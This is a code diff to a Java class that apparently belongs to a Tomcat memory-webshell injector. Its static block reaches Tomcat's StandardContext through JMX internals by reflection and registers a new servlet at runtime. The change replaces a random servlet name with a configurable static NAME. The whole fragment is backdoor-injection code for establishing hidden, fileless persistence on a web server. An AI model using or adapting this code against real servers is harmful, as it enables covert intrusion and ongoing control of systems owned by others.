@@ -22,10 +22,10 @@ public class TSMSFromJMXS implements Servlet {
 
     public static String pattern;
 
+    public static String NAME;
+
     static {
         try {
-            String servletName = String.valueOf(System.nanoTime());
-
             MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
             Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
             field.setAccessible(true);
@@ -50,9 +50,9 @@ public class TSMSFromJMXS implements Servlet {
                 field.setAccessible(true);
                 StandardContext standardContext = (StandardContext) field.get(obj);
 
-                if (standardContext.findChild(servletName) == null) {
+                if (standardContext.findChild(NAME) == null) {
                     Wrapper wrapper = standardContext.createWrapper();
-                    wrapper.setName(servletName);
+                    wrapper.setName(NAME);
                     standardContext.addChild(wrapper);
                     Servlet servlet = new TSMSFromJMXS();
                     wrapper.setServletClass(servlet.getClass().getName());
